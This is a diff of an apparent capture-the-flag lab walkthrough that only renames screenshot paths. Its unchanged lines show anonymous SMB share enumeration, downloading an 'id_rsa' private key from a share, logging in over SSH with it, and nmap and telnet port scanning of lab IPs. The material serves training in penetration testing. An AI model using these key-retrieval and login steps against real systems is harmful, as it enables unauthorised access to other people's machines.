@@ -31,7 +31,7 @@ smbclient -L 10.48.181.56
 
 After enumerating we will find a share name called profiles
 
-![enum results](101.png)
+![enum results](Assets/101.png)
 
 ```
 smbclient //10.48.181.56/profiles -U Anonymous
@@ -39,7 +39,7 @@ smbclient //10.48.181.56/profiles -U Anonymous
 
 We are logged in
 
-![[102.png]]
+![enum results](Assets/102.png)
 
 ```
 more "Working From Home Information.txt"
@@ -57,7 +57,7 @@ ls
 get id_rsa
 ```
 
-![[103.png]]
+![enum results](Assets/103.png)
 
 Now we will use this rsa file to login
 
@@ -69,7 +69,7 @@ chmod 600 id_rsa
 ssh -i id_rsa cactus@<IP>
 ```
 
-![[104.png]]
+![enum results](Assets/104.png)
 
 ```
 ls
@@ -79,7 +79,7 @@ ls
 cat smb.txt
 ```
 
-![[105.png]]
+![enum results](Assets/105.png)
 
 #### Task-6 
 
@@ -89,7 +89,7 @@ This one scans a lot of ports so it takes time
 nmap -p- -vv -T5 10.48.148.51
 ```
 
-![[106.png]]
+![enum results](Assets/106.png)
 
 ```
 nmap -p8012 -v  10.48.148.51
@@ -101,7 +101,7 @@ We found a port 8012
 telnet 10.48.148.51 8012
 ```
 
-![[107.png]]
+![enum results](Assets/107.png)
 
 #### Task-9
 
@@ -109,7 +109,7 @@ telnet 10.48.148.51 8012
 nmap -F 10.49.136.137 
 ```
 
-![[108.png]]
+![enum results](Assets/108.png)
 
 
 
